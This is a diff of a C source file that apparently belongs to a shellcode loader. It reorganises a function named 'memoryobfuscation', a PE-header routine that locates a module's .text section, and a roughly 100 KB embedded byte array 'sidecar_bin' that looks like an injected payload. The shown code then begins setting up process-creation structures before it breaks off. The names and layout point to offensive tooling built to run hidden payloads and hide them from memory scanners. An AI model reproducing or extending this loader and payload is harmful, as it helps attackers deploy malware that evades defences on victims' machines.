@@ -1,7 +1,34 @@
 #include <stdio.h>
 
+typedef struct {
+    void* baseAddress;
+    DWORD size;
+} TextSectionInfo;
 
-unsigned char sidecar_bin[] = {
+
+TextSectionInfo GetTextSectionInfo(HMODULE hModule) {
+    
+    TextSectionInfo info = { 0 };
+
+    BYTE* baseAddr = (BYTE*)hModule;
+    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddr;
+    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddr + dosHeader->e_lfanew);
+    IMAGE_SECTION_HEADER* section = IMAGE_FIRST_SECTION(ntHeaders);
+
+    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i) {
+        if (strncmp((char*)section->Name, ".text", 5) == 0) {
+            info.baseAddress = baseAddr + section->VirtualAddress;
+            info.size = section->Misc.VirtualSize;
+            break;
+        }
+        ++section;
+    }
+
+    return info;
+}
+
+void memoryobfuscation(){
+    unsigned char sidecar_bin[] = {
   0xe8, 0xc0, 0x25, 0x01, 0x00, 0xc0, 0x25, 0x01, 0x00, 0x0b, 0x92, 0xde,
   0x6c, 0xa3, 0xb2, 0x83, 0xb1, 0x84, 0xd1, 0x90, 0x83, 0x66, 0x3c, 0x8c,
   0x58, 0x09, 0xc4, 0x4f, 0x72, 0xfa, 0xcf, 0x40, 0x57, 0x0f, 0x40, 0x02,
@@ -8373,36 +8400,7 @@ unsigned char sidecar_bin[] = {
   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
 };
 unsigned int sidecar_bin_len = 100427;
-
-
-typedef struct {
-    void* baseAddress;
-    DWORD size;
-} TextSectionInfo;
-
-
-TextSectionInfo GetTextSectionInfo(HMODULE hModule) {
-    
-    TextSectionInfo info = { 0 };
-
-    BYTE* baseAddr = (BYTE*)hModule;
-    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddr;
-    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddr + dosHeader->e_lfanew);
-    IMAGE_SECTION_HEADER* section = IMAGE_FIRST_SECTION(ntHeaders);
-
-    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i) {
-        if (strncmp((char*)section->Name, ".text", 5) == 0) {
-            info.baseAddress = baseAddr + section->VirtualAddress;
-            info.size = section->Misc.VirtualSize;
-            break;
-        }
-        ++section;
-    }
-
-    return info;
-}
-
-void memoryobfuscation(){
+  
     STARTUPINFOA si = { 0 };
     PROCESS_INFORMATION pi = { 0 };
     si.cb = sizeof(si);
